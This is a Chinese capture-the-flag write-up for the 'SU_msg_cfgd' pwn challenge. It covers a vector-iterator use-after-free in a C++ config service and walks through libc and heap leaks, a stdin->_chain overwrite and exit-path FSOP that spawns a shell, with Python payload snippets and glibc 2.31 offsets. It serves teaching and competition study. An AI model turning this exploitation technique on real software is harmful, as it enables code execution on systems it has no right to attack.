# SU_msg_cfgd

## 题目简述

题目是一个使用 C++ 编写的配置消息服务。客户端通过自定义 TLV 协议批量提交配置操作，服务端使用 `std::vector<Config *> vec_objs` 保存对象，并用迭代器 `now_obj` 记录当前对象。

附件二进制为 64 位 PIE，开启 Full RELRO、Canary、NX、SHSTK 和 IBT。直接覆盖返回地址并不合适；源码中的决定性漏洞是 `std::vector` 扩容后没有更新 `now_obj`，随后删除对象会形成“悬空迭代器指向悬空对象”的双层 UAF。利用链依次完成 libc 泄露、堆地址泄露、伪造 FILE 结构和退出路径 FSOP。

## 解题过程

外层消息头为：

```c
struct CMD {
    int msg_type;
    int cmd_target;
    unsigned int cnt;
    char data[];
};
```

每个配置命令的线格式为：

```text
int32  type
uint32 name_length
byte[] name
uint32 content_length
byte[] content
uint8  updated
```

可以先写一个构造函数：

```python
def new_cfg(op, name, content, updated):
    return (
        p32(op)
        + p32(len(name)) + name
        + p32(len(content)) + content
        + p8(updated)
    )

def build_msg(configs):
    return p32(1) + p32(0x41) + p32(len(configs)) + b"".join(configs)
```

`MsgHandler` 初始化时只为 `vec_objs` 预留一个元素：

```cpp
MsgHandler() : handle_id(-1), now_obj(vec_objs.end()) {
    vec_objs.reserve(1);
}
```

每处理完一条命令，若 `updated` 为真，程序会重新搜索对象并设置 `now_obj`。但普通的 `cmdAdd()` 和 `cmdDelete()` 不会主动维护该迭代器：

```cpp
if (cfgCmd->updated) {
    now_obj = std::find_if(vec_objs.begin(), vec_objs.end(), ...);
}
```

利用顺序如下：

1. 添加 A、B、C、D 四个对象，让 `now_obj` 最后指向 C；
2. 添加 E，但令 `updated=0`；
3. 第五次 `push_back` 使容量从 4 扩大，旧的指针数组被释放；
4. `now_obj` 仍指向旧数组中保存 C 指针的槽位；
5. 删除新数组中的 C，C 对象及其 `name`、`content` 都被释放。

此时内存关系为：

```text
now_obj
   |
   v
freed vector slot -> freed Config -> freed name/content
```

`cmdVisit()` 仍会执行：

```cpp
printf("Current Object Name: %s\n", (*now_obj)->config_name);
printf("Content: %s\n", (*now_obj)->content);
```

因此可以通过重新分配释放区来建立泄露。第一轮给 C 分配约 `0x420` 字节的 `content`，删除后它进入 unsorted bin；再用后续解析产生的分配切割堆块，让悬空对象的 `content` 指针指向 unsorted-bin 残留指针。`cmdVisit` 输出该字段后，可按附件所用 Ubuntu 20.04/glibc 2.31 偏移计算：

```python
libc_leak = u64(io.recvline().strip().ljust(8, b"\x00"))
libc_base = libc_leak - 0x1ecbe0
```

第二轮使用同样的悬空迭代器与小块复用，让输出落到堆指针：

```python
heap_leak = u64(io.recvline().strip().ljust(8, b"\x00"))
heap_base = heap_leak - 0x127f0
```

两个差值都与附件 libc 和具体分配序列绑定。复现其他环境时，应根据 unsorted-bin 指针与实际 chunk 地址重新计算。

有了 libc 和 heap 基址后，最终目标不是覆盖 GOT，而是劫持 `_IO_2_1_stdin_` 的链表字段。先计算：

```python
stdin_chain = libc_base + 0x1ec980 + 0x68
system = libc_base + 0x52290
io_wfile_jumps = libc_base + 0x1e8f60
```

重新占用旧 `vec_objs` 的小块，并在悬空槽位处放入：

```python
p64(stdin_chain - 8)
```

`Config` 的 `config_name` 指针位于对象偏移 `+8`。于是程序通过悬空 `now_obj` 执行更新时：

```cpp
(*now_obj)->config_name = new_name;
```

实际改写的正好是 `stdin->_chain`，使其指向新申请的伪造 FILE。伪 FILE 的开头放置 `/bin/sh\0`，并按 glibc 2.31 的 wide FILE 布局布置 `_wide_data`、合法的 `_IO_wfile_jumps` 地址和 `system` 调用槽。exp 中的核心数据形态为：

```python
fake_file = (
    b"/bin/sh\x00"
    + p64(0)
    + p64(0x10)
    + p64(system)
    + p64(1)
    + p64(0x100)
)

# 中间按 _IO_FILE/_IO_wide_data 的字段偏移补零和指针
fake_file = fake_file.ljust(required_offset, b"\x00")
fake_file += p64(io_wfile_jumps + 0x30)
```

这里不能只复制某个通用 FSOP 模板：伪 FILE 的字段偏移、合法 vtable 区间和函数槽位置都取决于目标 glibc。正确的成功条件是：

```text
stdin->_chain -> fake FILE
fake FILE 的 wide 路径可被 flush
最终间接调用 system(fake_file)
fake_file 开头为 "/bin/sh"
```

最后发送一个长度小于 `sizeof(CMD)` 的输入，例如：

```python
io.sendline(b"T")
```

程序走到 `exit(0)`，标准 I/O 清理过程遍历被污染的 FILE 链并触发伪造的 wide vtable 路径，最终执行 `system("/bin/sh")`。取得 shell 后读取 `flag` 即可。

## 方法总结

本题最关键的审计点不是 `Config` 本身，而是容器迭代器的生命周期。`std::vector` 扩容会使全部旧迭代器失效；源码即使在某些命令后重新查找 `now_obj`，也不能保证其他 `push_back`、`erase` 路径安全。将容量变化、对象删除和迭代器更新分别画出，才能看到“双层 UAF”。

利用上先用 `cmdVisit` 把 UAF 转成可观察的 libc/heap 泄露，再利用旧 vector 槽位控制 `*now_obj`，最终把对象字段写转化为 `stdin->_chain` 写。二进制启用了完整 RELRO 和现代控制流保护，选择 FILE 链清理路径比硬打 GOT 更符合保护条件。所有 libc 偏移和伪 FILE 字段都必须与部署镜像一致。
